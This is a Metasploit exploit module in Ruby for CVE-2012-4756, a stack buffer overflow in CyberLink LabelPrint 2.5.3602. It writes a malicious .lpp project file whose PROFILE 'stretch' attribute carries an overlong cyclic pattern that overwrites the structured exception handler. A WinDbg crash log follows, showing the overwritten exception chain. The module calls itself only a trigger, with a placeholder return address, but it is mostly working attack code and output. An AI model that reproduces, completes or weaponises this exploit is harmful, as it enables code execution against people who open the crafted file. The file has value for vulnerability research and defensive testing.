require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CyberLink LabelPrint LPP Buffer Overflow',
			'Description'    => %q{
					This is simply a trigger for the CyberLink LabelPrint 
				LPP  "PROFILE/@stretch" buffer overflow
			},
			'License'        => 'BSD_LICENSE',
			'Author'         => [ 'Mario Ceballos' ],
			'References'     =>
				[
					[ 'CVE', '2012-4756' ],
					[ 'URL', 'http://secunia.com/advisories/49281/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x20\x0a\x20",
					'StackAdjustment' => -3500
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'CyberLink LabelPrint 2.5.3602', {  'Ret' => 0xfeedface } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Sep 03 2012',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.', 'msf.lpp']),
			], self.class)

	end

	def exploit

		sploit = pattern_create(4024)
		sploit[1050,2] = "\x14\x41"
		sploit[1052,2] = "\x42\x42"

		lpp = %Q|<PROJECT version="1.0.00"><APPLICATION step="4"/>
<PRINTER default="" x_offset="0" lightscribe_drive_index="18446744073709551615" lightscribe_drive_path="0" y_offset="0" copy="1" target_label="1" outline="0" hidetrack="0" lightscribe_print_quality="0" lightscribe_label_mode="0"/>
<PROFILE printout="FRONT_COVER" paper="Plain paper (Letter)" layout="Cover_2Column" background="" stretch="#{sploit}"/><FONT><TITLE point_size="0" bold="TRUE" italic="FALSE" underline="FALSE" strikeout="FALSE" shadow="TRUE" color="#000000" face="Microsoft Sans Serif" font_height="20" alignment="6" face_enabled="TRUE" border_enabled="FALSE" shadow_color="#000000" border_color="#000000"/><CONTENT point_size="0" bold="FALSE" italic="FALSE" underline="FALSE" strikeout="FALSE" shadow="FALSE" color="#000000" face="" font_height="0" alignment="0" face_enabled="FALSE" border_enabled="FALSE" shadow_color="#000000" border_color="#000000"/>
</FONT>
<INFORMATION title="test" author="test" date="10/16/2012" SystemTime="16/10/2012"/>
<LAYOUT version="1.0">
<CONTENT loading="BALANCED" break="BY_ROW" row_spacing="0">
<FIELD type="NUMBER" width="600" right_spacing="300" fixed_width="true"/>
<FIELD type="SONG" width="4000" right_spacing="0" fixed_width="true"/>
<TEXT angle="0" default="" curving="STRAIGHT"/>
<MARGIN left="0" top="0" right="0" bottom="0" line_spacing="40"/>
<BOUNDARY hole="IGNORE" edge="IGNORE"/>
<BOUNDBOX left="700" top="3300" width="4800" height="4400" z_order="0" align="LEFT" valign="TOP"/>
<FONT point_size="0" bold="false" italic="true" underline="false" strikeout="false" shadow="false" face="Microsoft Sans Serif" color="0x000000" font_height="8" alignment="6" face_enabled="true" border_enabled="false" shadow_color="0x000000" border_color="0x000000"/>
<BOUNDBOX left="6300" top="3300" width="4800" height="4400" z_order="1" align="LEFT" valign="TOP"/>
<FONT point_size="0" bold="false" italic="true" underline="false" strikeout="false" shadow="false" face="Microsoft Sans Serif" color="0x000000" font_height="8" alignment="6" face_enabled="true" border_enabled="false" shadow_color="0x000000" border_color="0x000000"/>
</CONTENT><CAPTION type="TITLE"><BOUNDBOX left="1600" top="1300" width="8200" height="1200" z_order="2" align="" valign="CENTER"/><FONT point_size="0" bold="true" italic="false" underline="false" strikeout="false" shadow="true" face="Microsoft Sans Serif" color="0x000000" font_height="20" alignment="6" face_enabled="true" border_enabled="false" shadow_color="0x000000" border_color="0x000000"/>
<TEXT angle="0" default="test" curving="STRAIGHT"/>
<MARGIN left="0" top="0" right="0" bottom="0" line_spacing="100"/>
<BOUNDARY hole="IGNORE" edge="IGNORE"/>
</CAPTION>
</LAYOUT>
</PROJECT>
		|

		file_create(lpp)

	end

end
__END__
(6f8.e94): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=001e0045 ebx=014ab480 ecx=00130000 edx=001e413c esi=014c8cf8 edi=00000000
eip=7c37042b esp=0012e1dc ebp=0012ef50 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\CyberLink\LabelPrint\MSVCR71.dll - 
MSVCR71!wcscpy+0xb:
7c37042b 668901          mov     word ptr [ecx],ax        ds:0023:00130000=6341
0:000> !exchain
0012e200: *** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\CyberLink\LabelPrint\LabelPrint.exe
LabelPrint+6ed48 (0046ed48)
0012ef44: LabelPrint+20042 (00420042)
Invalid exception stack at 00410014

